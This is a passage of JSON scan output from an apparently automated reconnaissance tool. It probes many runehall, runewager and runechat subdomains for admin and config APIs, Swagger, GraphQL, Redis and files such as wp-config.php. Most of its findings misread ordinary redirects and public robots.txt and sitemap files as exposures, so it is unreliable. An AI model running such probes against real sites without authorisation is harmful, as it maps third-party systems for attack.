        "time": "22:02:05",
        "level": "debug",
        "message": "Testing API endpoints on http://test.runechat.com"
      },
      {
        "time": "22:02:07",
        "level": "warning",
        "message": "API endpoint exposed: http://test.runechat.com/api/v1/user (301)"
      },
      {
        "time": "22:02:18",
        "level": "warning",
        "message": "API endpoint exposed: http://test.runechat.com/api/v1/admin (301)"
      },
      {
        "time": "22:02:20",
        "level": "warning",
        "message": "API endpoint exposed: http://test.runechat.com/api/v1/config (301)"
      },
      {
        "time": "22:02:20",
        "level": "warning",
        "message": "API endpoint exposed: http://test.runechat.com/graphql (301)"
      },
      {
        "time": "22:02:26",
        "level": "warning",
        "message": "API endpoint exposed: http://test.runechat.com/rest/v1/users (301)"
      },
      {
        "time": "22:02:29",
        "level": "warning",
        "message": "API endpoint exposed: http://test.runechat.com/oauth/token (301)"
      },
      {
        "time": "22:02:31",
        "level": "warning",
        "message": "API endpoint exposed: http://test.runechat.com/v2/api-docs (301)"
      },
      {
        "time": "22:02:33",
        "level": "warning",
        "message": "API endpoint exposed: http://test.runechat.com/swagger-ui.html (301)"
      },
      {
        "time": "22:02:33",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:33",
        "level": "warning",
        "message": "API endpoint exposed: http://test.runechat.com/swagger.json (301)"
      },
      {
        "time": "22:02:33",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:34",
        "level": "warning",
        "message": "API endpoint exposed: http://test.runechat.com/actuator (301)"
      },
      {
        "time": "22:02:37",
        "level": "warning",
        "message": "API endpoint exposed: http://test.runechat.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "http://discord.runewager.com": {
    "findings": [
      {
        "time": "22:02:05",
        "level": "debug",
        "message": "Testing API endpoints on http://discord.runewager.com"
      },
      {
        "time": "22:02:08",
        "level": "warning",
        "message": "API endpoint exposed: http://discord.runewager.com/api/v1/user (301)"
      },
      {
        "time": "22:02:17",
        "level": "warning",
        "message": "API endpoint exposed: http://discord.runewager.com/api/v1/admin (301)"
      },
      {
        "time": "22:02:18",
        "level": "warning",
        "message": "API endpoint exposed: http://discord.runewager.com/api/v1/config (301)"
      },
      {
        "time": "22:02:18",
        "level": "warning",
        "message": "API endpoint exposed: http://discord.runewager.com/graphql (301)"
      },
      {
        "time": "22:02:24",
        "level": "warning",
        "message": "API endpoint exposed: http://discord.runewager.com/rest/v1/users (301)"
      },
      {
        "time": "22:02:33",
        "level": "warning",
        "message": "API endpoint exposed: http://discord.runewager.com/oauth/token (301)"
      },
      {
        "time": "22:02:33",
        "level": "warning",
        "message": "API endpoint exposed: http://discord.runewager.com/v2/api-docs (301)"
      },
      {
        "time": "22:02:33",
        "level": "warning",
        "message": "API endpoint exposed: http://discord.runewager.com/swagger-ui.html (301)"
      },
      {
        "time": "22:02:33",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:36",
        "level": "warning",
        "message": "API endpoint exposed: http://discord.runewager.com/swagger.json (301)"
      },
      {
        "time": "22:02:36",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:37",
        "level": "warning",
        "message": "API endpoint exposed: http://discord.runewager.com/actuator (301)"
      },
      {
        "time": "22:02:40",
        "level": "warning",
        "message": "API endpoint exposed: http://discord.runewager.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "http://runechat.com": {
    "findings": [
      {
        "time": "22:02:05",
        "level": "debug",
        "message": "Testing API endpoints on http://runechat.com"
      },
      {
        "time": "22:02:07",
        "level": "warning",
        "message": "API endpoint exposed: http://runechat.com/api/v1/user (301)"
      },
      {
        "time": "22:02:26",
        "level": "warning",
        "message": "API endpoint exposed: http://runechat.com/api/v1/admin (301)"
      },
      {
        "time": "22:02:27",
        "level": "warning",
        "message": "API endpoint exposed: http://runechat.com/api/v1/config (301)"
      },
      {
        "time": "22:02:27",
        "level": "warning",
        "message": "API endpoint exposed: http://runechat.com/graphql (301)"
      },
      {
        "time": "22:02:29",
        "level": "warning",
        "message": "API endpoint exposed: http://runechat.com/rest/v1/users (301)"
      },
      {
        "time": "22:02:35",
        "level": "warning",
        "message": "API endpoint exposed: http://runechat.com/oauth/token (301)"
      },
      {
        "time": "22:02:36",
        "level": "warning",
        "message": "API endpoint exposed: http://runechat.com/v2/api-docs (301)"
      },
      {
        "time": "22:02:37",
        "level": "warning",
        "message": "API endpoint exposed: http://runechat.com/swagger-ui.html (301)"
      },
      {
        "time": "22:02:37",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:41",
        "level": "warning",
        "message": "API endpoint exposed: http://runechat.com/swagger.json (301)"
      },
      {
        "time": "22:02:41",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:46",
        "level": "warning",
        "message": "API endpoint exposed: http://runechat.com/actuator (301)"
      },
      {
        "time": "22:02:46",
        "level": "warning",
        "message": "API endpoint exposed: http://runechat.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "http://runewager.com": {
    "findings": [
      {
        "time": "22:02:07",
        "level": "debug",
        "message": "Testing API endpoints on http://runewager.com"
      },
      {
        "time": "22:02:08",
        "level": "warning",
        "message": "API endpoint exposed: http://runewager.com/api/v1/user (301)"
      },
      {
        "time": "22:02:26",
        "level": "warning",
        "message": "API endpoint exposed: http://runewager.com/api/v1/admin (301)"
      },
      {
        "time": "22:02:27",
        "level": "warning",
        "message": "API endpoint exposed: http://runewager.com/api/v1/config (301)"
      },
      {
        "time": "22:02:28",
        "level": "warning",
        "message": "API endpoint exposed: http://runewager.com/graphql (301)"
      },
      {
        "time": "22:02:30",
        "level": "warning",
        "message": "API endpoint exposed: http://runewager.com/rest/v1/users (301)"
      },
      {
        "time": "22:02:37",
        "level": "warning",
        "message": "API endpoint exposed: http://runewager.com/oauth/token (301)"
      },
      {
        "time": "22:02:37",
        "level": "warning",
        "message": "API endpoint exposed: http://runewager.com/v2/api-docs (301)"
      },
      {
        "time": "22:02:40",
        "level": "warning",
        "message": "API endpoint exposed: http://runewager.com/swagger-ui.html (301)"
      },
      {
        "time": "22:02:40",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:41",
        "level": "warning",
        "message": "API endpoint exposed: http://runewager.com/swagger.json (301)"
      },
      {
        "time": "22:02:41",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:41",
        "level": "warning",
        "message": "API endpoint exposed: http://runewager.com/actuator (301)"
      },
      {
        "time": "22:02:43",
        "level": "warning",
        "message": "API endpoint exposed: http://runewager.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "http://staging.runewager.com": {
    "findings": [
      {
        "time": "22:02:09",
        "level": "debug",
        "message": "Testing API endpoints on http://staging.runewager.com"
      },
      {
        "time": "22:02:10",
        "level": "warning",
        "message": "API endpoint exposed: http://staging.runewager.com/api/v1/user (301)"
      },
      {
        "time": "22:02:20",
        "level": "warning",
        "message": "API endpoint exposed: http://staging.runewager.com/api/v1/admin (301)"
      },
      {
        "time": "22:02:20",
        "level": "warning",
        "message": "API endpoint exposed: http://staging.runewager.com/api/v1/config (301)"
      },
      {
        "time": "22:02:23",
        "level": "warning",
        "message": "API endpoint exposed: http://staging.runewager.com/graphql (301)"
      },
      {
        "time": "22:02:29",
        "level": "warning",
        "message": "API endpoint exposed: http://staging.runewager.com/rest/v1/users (301)"
      },
      {
        "time": "22:02:45",
        "level": "warning",
        "message": "API endpoint exposed: http://staging.runewager.com/oauth/token (301)"
      },
      {
        "time": "22:02:47",
        "level": "warning",
        "message": "API endpoint exposed: http://staging.runewager.com/v2/api-docs (301)"
      },
      {
        "time": "22:02:54",
        "level": "warning",
        "message": "API endpoint exposed: http://staging.runewager.com/swagger-ui.html (301)"
      },
      {
        "time": "22:02:54",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:54",
        "level": "warning",
        "message": "API endpoint exposed: http://staging.runewager.com/swagger.json (301)"
      },
      {
        "time": "22:02:54",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:54",
        "level": "warning",
        "message": "API endpoint exposed: http://staging.runewager.com/actuator (301)"
      },
      {
        "time": "22:02:54",
        "level": "warning",
        "message": "API endpoint exposed: http://staging.runewager.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "http://api.runehall.com": {
    "findings": [
      {
        "time": "22:02:13",
        "level": "debug",
        "message": "Testing API endpoints on http://api.runehall.com"
      },
      {
        "time": "22:02:15",
        "level": "warning",
        "message": "API endpoint exposed: http://api.runehall.com/api/v1/user (301)"
      },
      {
        "time": "22:02:19",
        "level": "warning",
        "message": "API endpoint exposed: http://api.runehall.com/api/v1/admin (301)"
      },
      {
        "time": "22:02:19",
        "level": "warning",
        "message": "API endpoint exposed: http://api.runehall.com/api/v1/config (301)"
      },
      {
        "time": "22:02:19",
        "level": "warning",
        "message": "API endpoint exposed: http://api.runehall.com/graphql (301)"
      },
      {
        "time": "22:02:21",
        "level": "warning",
        "message": "API endpoint exposed: http://api.runehall.com/rest/v1/users (301)"
      },
      {
        "time": "22:02:22",
        "level": "warning",
        "message": "API endpoint exposed: http://api.runehall.com/oauth/token (301)"
      },
      {
        "time": "22:02:25",
        "level": "warning",
        "message": "API endpoint exposed: http://api.runehall.com/v2/api-docs (301)"
      },
      {
        "time": "22:02:26",
        "level": "warning",
        "message": "API endpoint exposed: http://api.runehall.com/swagger-ui.html (301)"
      },
      {
        "time": "22:02:26",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:27",
        "level": "warning",
        "message": "API endpoint exposed: http://api.runehall.com/swagger.json (301)"
      },
      {
        "time": "22:02:27",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:29",
        "level": "warning",
        "message": "API endpoint exposed: http://api.runehall.com/actuator (301)"
      },
      {
        "time": "22:02:32",
        "level": "warning",
        "message": "API endpoint exposed: http://api.runehall.com/wp-json/wp/v2/users (301)"
      },
      {
        "time": "22:02:50",
        "level": "debug",
        "message": "Testing GraphQL at http://api.runehall.com"
      }
    ]
  },
  "http://sockets.runehall.com": {
    "findings": [
      {
        "time": "22:02:14",
        "level": "debug",
        "message": "Testing API endpoints on http://sockets.runehall.com"
      },
      {
        "time": "22:02:14",
        "level": "warning",
        "message": "API endpoint exposed: http://sockets.runehall.com/api/v1/user (301)"
      },
      {
        "time": "22:02:27",
        "level": "warning",
        "message": "API endpoint exposed: http://sockets.runehall.com/api/v1/admin (301)"
      },
      {
        "time": "22:02:28",
        "level": "warning",
        "message": "API endpoint exposed: http://sockets.runehall.com/api/v1/config (301)"
      },
      {
        "time": "22:02:29",
        "level": "warning",
        "message": "API endpoint exposed: http://sockets.runehall.com/graphql (301)"
      },
      {
        "time": "22:02:38",
        "level": "warning",
        "message": "API endpoint exposed: http://sockets.runehall.com/rest/v1/users (301)"
      },
      {
        "time": "22:02:40",
        "level": "warning",
        "message": "API endpoint exposed: http://sockets.runehall.com/oauth/token (301)"
      },
      {
        "time": "22:02:41",
        "level": "warning",
        "message": "API endpoint exposed: http://sockets.runehall.com/v2/api-docs (301)"
      },
      {
        "time": "22:02:41",
        "level": "warning",
        "message": "API endpoint exposed: http://sockets.runehall.com/swagger-ui.html (301)"
      },
      {
        "time": "22:02:41",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:42",
        "level": "warning",
        "message": "API endpoint exposed: http://sockets.runehall.com/swagger.json (301)"
      },
      {
        "time": "22:02:42",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:47",
        "level": "warning",
        "message": "API endpoint exposed: http://sockets.runehall.com/actuator (301)"
      },
      {
        "time": "22:02:47",
        "level": "warning",
        "message": "API endpoint exposed: http://sockets.runehall.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "http://admin.runewager.com/graphql": {
    "findings": [
      {
        "time": "22:02:16",
        "level": "debug",
        "message": "Testing GraphQL at http://admin.runewager.com/graphql"
      }
    ]
  },
  "http://420.runehall.com": {
    "findings": [
      {
        "time": "22:02:17",
        "level": "debug",
        "message": "Testing API endpoints on http://420.runehall.com"
      },
      {
        "time": "22:02:20",
        "level": "warning",
        "message": "API endpoint exposed: http://420.runehall.com/api/v1/user (301)"
      },
      {
        "time": "22:02:37",
        "level": "warning",
        "message": "API endpoint exposed: http://420.runehall.com/api/v1/admin (301)"
      },
      {
        "time": "22:02:37",
        "level": "warning",
        "message": "API endpoint exposed: http://420.runehall.com/api/v1/config (301)"
      },
      {
        "time": "22:02:37",
        "level": "warning",
        "message": "API endpoint exposed: http://420.runehall.com/graphql (301)"
      },
      {
        "time": "22:02:39",
        "level": "warning",
        "message": "API endpoint exposed: http://420.runehall.com/rest/v1/users (301)"
      },
      {
        "time": "22:02:50",
        "level": "warning",
        "message": "API endpoint exposed: http://420.runehall.com/oauth/token (301)"
      },
      {
        "time": "22:02:51",
        "level": "warning",
        "message": "API endpoint exposed: http://420.runehall.com/v2/api-docs (301)"
      },
      {
        "time": "22:02:51",
        "level": "warning",
        "message": "API endpoint exposed: http://420.runehall.com/swagger-ui.html (301)"
      },
      {
        "time": "22:02:51",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:54",
        "level": "warning",
        "message": "API endpoint exposed: http://420.runehall.com/swagger.json (301)"
      },
      {
        "time": "22:02:54",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:55",
        "level": "warning",
        "message": "API endpoint exposed: http://420.runehall.com/actuator (301)"
      },
      {
        "time": "22:02:55",
        "level": "warning",
        "message": "API endpoint exposed: http://420.runehall.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "http://support.runewager.com": {
    "findings": [
      {
        "time": "22:02:18",
        "level": "debug",
        "message": "Testing API endpoints on http://support.runewager.com"
      },
      {
        "time": "22:02:18",
        "level": "warning",
        "message": "API endpoint exposed: http://support.runewager.com/api/v1/user (301)"
      },
      {
        "time": "22:02:27",
        "level": "warning",
        "message": "API endpoint exposed: http://support.runewager.com/api/v1/admin (301)"
      },
      {
        "time": "22:02:29",
        "level": "warning",
        "message": "API endpoint exposed: http://support.runewager.com/api/v1/config (301)"
      },
      {
        "time": "22:02:31",
        "level": "warning",
        "message": "API endpoint exposed: http://support.runewager.com/graphql (301)"
      },
      {
        "time": "22:02:34",
        "level": "warning",
        "message": "API endpoint exposed: http://support.runewager.com/rest/v1/users (301)"
      },
      {
        "time": "22:02:45",
        "level": "warning",
        "message": "API endpoint exposed: http://support.runewager.com/oauth/token (301)"
      },
      {
        "time": "22:02:45",
        "level": "warning",
        "message": "API endpoint exposed: http://support.runewager.com/v2/api-docs (301)"
      },
      {
        "time": "22:02:46",
        "level": "warning",
        "message": "API endpoint exposed: http://support.runewager.com/swagger-ui.html (301)"
      },
      {
        "time": "22:02:46",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:46",
        "level": "warning",
        "message": "API endpoint exposed: http://support.runewager.com/swagger.json (301)"
      },
      {
        "time": "22:02:46",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:47",
        "level": "warning",
        "message": "API endpoint exposed: http://support.runewager.com/actuator (301)"
      },
      {
        "time": "22:02:48",
        "level": "warning",
        "message": "API endpoint exposed: http://support.runewager.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "http://discord.runewager.com/graphql": {
    "findings": [
      {
        "time": "22:02:18",
        "level": "debug",
        "message": "Testing GraphQL at http://discord.runewager.com/graphql"
      }
    ]
  },
  "http://www.discord.runewager.com/graphql": {
    "findings": [
      {
        "time": "22:02:19",
        "level": "debug",
        "message": "Testing GraphQL at http://www.discord.runewager.com/graphql"
      }
    ]
  },
  "http://api.runehall.com/graphql": {
    "findings": [
      {
        "time": "22:02:19",
        "level": "debug",
        "message": "Testing GraphQL at http://api.runehall.com/graphql"
      }
    ]
  },
  "http://test.runechat.com/graphql": {
    "findings": [
      {
        "time": "22:02:20",
        "level": "debug",
        "message": "Testing GraphQL at http://test.runechat.com/graphql"
      }
    ]
  },
  "http://wss.runehall.com": {
    "findings": [
      {
        "time": "22:02:23",
        "level": "debug",
        "message": "Testing API endpoints on http://wss.runehall.com"
      },
      {
        "time": "22:02:25",
        "level": "warning",
        "message": "API endpoint exposed: http://wss.runehall.com/api/v1/user (301)"
      },
      {
        "time": "22:02:34",
        "level": "warning",
        "message": "API endpoint exposed: http://wss.runehall.com/api/v1/admin (301)"
      },
      {
        "time": "22:02:37",
        "level": "warning",
        "message": "API endpoint exposed: http://wss.runehall.com/api/v1/config (301)"
      },
      {
        "time": "22:02:37",
        "level": "warning",
        "message": "API endpoint exposed: http://wss.runehall.com/graphql (301)"
      },
      {
        "time": "22:02:48",
        "level": "warning",
        "message": "API endpoint exposed: http://wss.runehall.com/rest/v1/users (301)"
      },
      {
        "time": "22:02:52",
        "level": "warning",
        "message": "API endpoint exposed: http://wss.runehall.com/oauth/token (301)"
      },
      {
        "time": "22:02:55",
        "level": "warning",
        "message": "API endpoint exposed: http://wss.runehall.com/v2/api-docs (301)"
      },
      {
        "time": "22:02:56",
        "level": "warning",
        "message": "API endpoint exposed: http://wss.runehall.com/swagger-ui.html (301)"
      },
      {
        "time": "22:02:56",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:57",
        "level": "warning",
        "message": "API endpoint exposed: http://wss.runehall.com/swagger.json (301)"
      },
      {
        "time": "22:02:57",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:58",
        "level": "warning",
        "message": "API endpoint exposed: http://wss.runehall.com/actuator (301)"
      },
      {
        "time": "22:02:58",
        "level": "warning",
        "message": "API endpoint exposed: http://wss.runehall.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "http://staging.runewager.com/graphql": {
    "findings": [
      {
        "time": "22:02:23",
        "level": "debug",
        "message": "Testing GraphQL at http://staging.runewager.com/graphql"
      }
    ]
  },
  "http://runechat.com/graphql": {
    "findings": [
      {
        "time": "22:02:27",
        "level": "debug",
        "message": "Testing GraphQL at http://runechat.com/graphql"
      }
    ]
  },
  "http://runewager.com/graphql": {
    "findings": [
      {
        "time": "22:02:28",
        "level": "debug",
        "message": "Testing GraphQL at http://runewager.com/graphql"
      }
    ]
  },
  "http://sockets.runehall.com/graphql": {
    "findings": [
      {
        "time": "22:02:29",
        "level": "debug",
        "message": "Testing GraphQL at http://sockets.runehall.com/graphql"
      }
    ]
  },
  "http://69.runehall.com": {
    "findings": [
      {
        "time": "22:02:31",
        "level": "debug",
        "message": "Testing API endpoints on http://69.runehall.com"
      },
      {
        "time": "22:02:32",
        "level": "warning",
        "message": "API endpoint exposed: http://69.runehall.com/api/v1/user (301)"
      },
      {
        "time": "22:02:41",
        "level": "warning",
        "message": "API endpoint exposed: http://69.runehall.com/api/v1/admin (301)"
      },
      {
        "time": "22:02:41",
        "level": "warning",
        "message": "API endpoint exposed: http://69.runehall.com/api/v1/config (301)"
      },
      {
        "time": "22:02:43",
        "level": "warning",
        "message": "API endpoint exposed: http://69.runehall.com/graphql (301)"
      },
      {
        "time": "22:02:47",
        "level": "warning",
        "message": "API endpoint exposed: http://69.runehall.com/rest/v1/users (301)"
      },
      {
        "time": "22:02:54",
        "level": "warning",
        "message": "API endpoint exposed: http://69.runehall.com/oauth/token (301)"
      },
      {
        "time": "22:02:55",
        "level": "warning",
        "message": "API endpoint exposed: http://69.runehall.com/v2/api-docs (301)"
      },
      {
        "time": "22:02:59",
        "level": "warning",
        "message": "API endpoint exposed: http://69.runehall.com/swagger-ui.html (301)"
      },
      {
        "time": "22:02:59",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:59",
        "level": "warning",
        "message": "API endpoint exposed: http://69.runehall.com/swagger.json (301)"
      },
      {
        "time": "22:02:59",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:03:00",
        "level": "warning",
        "message": "API endpoint exposed: http://69.runehall.com/actuator (301)"
      },
      {
        "time": "22:03:00",
        "level": "warning",
        "message": "API endpoint exposed: http://69.runehall.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "http://support.runewager.com/graphql": {
    "findings": [
      {
        "time": "22:02:31",
        "level": "debug",
        "message": "Testing GraphQL at http://support.runewager.com/graphql"
      }
    ]
  },
  "http://cdn.runehall.com": {
    "findings": [
      {
        "time": "22:02:35",
        "level": "debug",
        "message": "Testing API endpoints on http://cdn.runehall.com"
      },
      {
        "time": "22:02:36",
        "level": "warning",
        "message": "API endpoint exposed: http://cdn.runehall.com/api/v1/user (301)"
      },
      {
        "time": "22:02:44",
        "level": "warning",
        "message": "API endpoint exposed: http://cdn.runehall.com/api/v1/admin (301)"
      },
      {
        "time": "22:02:44",
        "level": "warning",
        "message": "API endpoint exposed: http://cdn.runehall.com/api/v1/config (301)"
      },
      {
        "time": "22:02:44",
        "level": "warning",
        "message": "API endpoint exposed: http://cdn.runehall.com/graphql (301)"
      },
      {
        "time": "22:02:52",
        "level": "warning",
        "message": "API endpoint exposed: http://cdn.runehall.com/rest/v1/users (301)"
      },
      {
        "time": "22:02:57",
        "level": "warning",
        "message": "API endpoint exposed: http://cdn.runehall.com/oauth/token (301)"
      },
      {
        "time": "22:03:03",
        "level": "warning",
        "message": "API endpoint exposed: http://cdn.runehall.com/v2/api-docs (301)"
      },
      {
        "time": "22:03:03",
        "level": "warning",
        "message": "API endpoint exposed: http://cdn.runehall.com/swagger-ui.html (301)"
      },
      {
        "time": "22:03:03",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:03:04",
        "level": "warning",
        "message": "API endpoint exposed: http://cdn.runehall.com/swagger.json (301)"
      },
      {
        "time": "22:03:04",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:03:04",
        "level": "warning",
        "message": "API endpoint exposed: http://cdn.runehall.com/actuator (301)"
      },
      {
        "time": "22:03:04",
        "level": "warning",
        "message": "API endpoint exposed: http://cdn.runehall.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "http://wss.runehall.com/graphql": {
    "findings": [
      {
        "time": "22:02:37",
        "level": "debug",
        "message": "Testing GraphQL at http://wss.runehall.com/graphql"
      }
    ]
  },
  "http://420.runehall.com/graphql": {
    "findings": [
      {
        "time": "22:02:37",
        "level": "debug",
        "message": "Testing GraphQL at http://420.runehall.com/graphql"
      }
    ]
  },
  "http://blog.runehall.com": {
    "findings": [
      {
        "time": "22:02:41",
        "level": "debug",
        "message": "Testing API endpoints on http://blog.runehall.com"
      },
      {
        "time": "22:02:42",
        "level": "warning",
        "message": "API endpoint exposed: http://blog.runehall.com/api/v1/user (301)"
      },
      {
        "time": "22:02:48",
        "level": "warning",
        "message": "API endpoint exposed: http://blog.runehall.com/api/v1/admin (301)"
      },
      {
        "time": "22:02:48",
        "level": "warning",
        "message": "API endpoint exposed: http://blog.runehall.com/api/v1/config (301)"
      },
      {
        "time": "22:02:49",
        "level": "warning",
        "message": "API endpoint exposed: http://blog.runehall.com/graphql (301)"
      },
      {
        "time": "22:02:53",
        "level": "warning",
        "message": "API endpoint exposed: http://blog.runehall.com/rest/v1/users (301)"
      },
      {
        "time": "22:02:58",
        "level": "warning",
        "message": "API endpoint exposed: http://blog.runehall.com/oauth/token (301)"
      },
      {
        "time": "22:02:58",
        "level": "warning",
        "message": "API endpoint exposed: http://blog.runehall.com/v2/api-docs (301)"
      },
      {
        "time": "22:02:58",
        "level": "warning",
        "message": "API endpoint exposed: http://blog.runehall.com/swagger-ui.html (301)"
      },
      {
        "time": "22:02:58",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:02:59",
        "level": "warning",
        "message": "API endpoint exposed: http://blog.runehall.com/swagger.json (301)"
      },
      {
        "time": "22:02:59",
        "level": "critical",
        "message": "Swagger UI exposed - potential API documentation leak"
      },
      {
        "time": "22:03:03",
        "level": "warning",
        "message": "API endpoint exposed: http://blog.runehall.com/actuator (301)"
      },
      {
        "time": "22:03:03",
        "level": "warning",
        "message": "API endpoint exposed: http://blog.runehall.com/wp-json/wp/v2/users (301)"
      }
    ]
  },
  "http://69.runehall.com/graphql": {
    "findings": [
      {
        "time": "22:02:43",
        "level": "debug",
        "message": "Testing GraphQL at http://69.runehall.com/graphql"
      }
    ]
  },
  "http://cdn.runehall.com/graphql": {
    "findings": [
      {
        "time": "22:02:44",
        "level": "debug",
        "message": "Testing GraphQL at http://cdn.runehall.com/graphql"
      }
    ]
  },
  "http://blog.runehall.com/graphql": {
    "findings": [
      {
        "time": "22:02:49",
        "level": "debug",
        "message": "Testing GraphQL at http://blog.runehall.com/graphql"
      }
    ]
  },
  "https://api.runehall.com": {
    "findings": [
      {
        "time": "22:02:57",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://api.runehall.com/robots.txt"
      },
      {
        "time": "22:02:57",
        "level": "debug",
        "message": "File content sample: User-agent: * Disallow: ..."
      },
      {
        "time": "22:03:15",
        "level": "debug",
        "message": "Testing API endpoints on https://api.runehall.com"
      },
      {
        "time": "22:03:36",
        "level": "debug",
        "message": "Testing GraphQL at https://api.runehall.com"
      }
    ]
  },
  "crash.runehall.com": {
    "findings": [
      {
        "time": "22:03:07",
        "level": "info",
        "message": "Scanning subdomain: crash.runehall.com"
      },
      {
        "time": "22:03:09",
        "level": "success",
        "message": "Web server active: http://crash.runehall.com (301)"
      },
      {
        "time": "22:04:01",
        "level": "debug",
        "message": "Testing WebSocket on wss.crash.runehall.com"
      },
      {
        "time": "22:04:01",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:04:01",
        "level": "debug",
        "message": "Testing Redis access on crash.runehall.com"
      },
      {
        "time": "22:04:11",
        "level": "debug",
        "message": "HTTP 502 from https://crash.runehall.com"
      }
    ]
  },
  "https://support.runewager.com": {
    "findings": [
      {
        "time": "22:03:09",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://support.runewager.com/robots.txt"
      },
      {
        "time": "22:03:09",
        "level": "debug",
        "message": "File content sample: User-agent: * Disallow:  Sitemap: https://support.runewager.com/sitemap.xml..."
      },
      {
        "time": "22:03:10",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://support.runewager.com/sitemap.xml"
      },
      {
        "time": "22:03:10",
        "level": "debug",
        "message": "File content sample: <?xml version=\"1.0\" encoding=\"UTF-8\"?><urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" xmlns:xhtml=\"http://www.w3.org/1999/xhtml\"><url><loc>https://support.runewager.com/</loc><changefreq>d..."
      },
      {
        "time": "22:03:26",
        "level": "debug",
        "message": "Testing API endpoints on https://support.runewager.com"
      },
      {
        "time": "22:03:30",
        "level": "warning",
        "message": "API endpoint exposed: https://support.runewager.com/graphql (301)"
      },
      {
        "time": "22:03:39",
        "level": "warning",
        "message": "API endpoint exposed: https://support.runewager.com/actuator (301)"
      }
    ]
  },
  "jbl.runehall.com": {
    "findings": [
      {
        "time": "22:03:12",
        "level": "info",
        "message": "Scanning subdomain: jbl.runehall.com"
      },
      {
        "time": "22:03:12",
        "level": "success",
        "message": "Web server active: http://jbl.runehall.com (301)"
      },
      {
        "time": "22:03:55",
        "level": "debug",
        "message": "Testing WebSocket on wss.jbl.runehall.com"
      },
      {
        "time": "22:03:55",
        "level": "debug",
        "message": "WebSocket test failed: WebSocket.__init__() missing 3 required positional arguments: 'environ', 'socket', and 'rfile'"
      },
      {
        "time": "22:03:55",
        "level": "debug",
        "message": "Testing Redis access on jbl.runehall.com"
      },
      {
        "time": "22:04:05",
        "level": "debug",
        "message": "HTTP 530 from https://jbl.runehall.com"
      }
    ]
  },
  "https://staging.runewager.com": {
    "findings": [
      {
        "time": "22:03:14",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://staging.runewager.com/robots.txt"
      },
      {
        "time": "22:03:14",
        "level": "debug",
        "message": "File content sample: User-agent: * Disallow:  Sitemap: https://www.runewager.com/sitemap.xml ..."
      },
      {
        "time": "22:03:14",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://staging.runewager.com/sitemap.xml"
      },
      {
        "time": "22:03:14",
        "level": "debug",
        "message": "File content sample: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" xmlns:xhtml=\"http://www.w3.org/1999/xhtml\">   <url>     <loc>https://www.runewager.com/</loc>     <la..."
      },
      {
        "time": "22:03:15",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://staging.runewager.com/crossdomain.xml"
      },
      {
        "time": "22:03:15",
        "level": "debug",
        "message": "File content sample: <!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><link rel=\"icon\" href=\"/rw.ico?v2\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/><meta name=\"theme-color\" content=\"#0..."
      },
      {
        "time": "22:03:18",
        "level": "critical",
        "message": "EXPOSED SENSITIVE FILE: https://staging.runewager.com/wp-config.php"
      },
      {
        "time": "22:03:18",
        "level": "debug",
